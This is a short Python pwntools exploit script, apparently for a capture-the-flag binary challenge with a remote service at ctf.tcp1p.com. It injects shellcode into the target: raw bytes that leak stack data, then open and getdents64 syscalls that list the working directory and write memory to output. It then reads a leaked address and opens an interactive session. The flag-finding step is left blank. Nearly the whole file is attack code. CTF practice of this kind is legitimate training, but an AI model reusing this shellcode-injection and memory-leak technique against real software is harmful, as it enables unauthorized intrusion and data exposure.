#!/usr/bin/python3

from pwn import *

exe = ELF('./chall', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000555555555478

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ctf.tcp1p.com', 4267)
else:
        p = process(exe.path)
GDB()
leak = b"\x41\x50\x48\x89\xE6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x10\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05" + asm(shellcraft.open(".")) + asm(shellcraft.syscall('SYS_getdents64', 0x3, 0x155555519b00, 0x200))
leak += asm('''
                mov rsi, r8
                add rsi, 0xb00
                mov rdi, 0x1
                mov rdx, 0x400
                mov rax, 0x1
                syscall        
            ''')

sa(b'me? \n', leak)
base = u64(p.recv(8))
print(hex(base))
# find_flag = 

p.interactive()
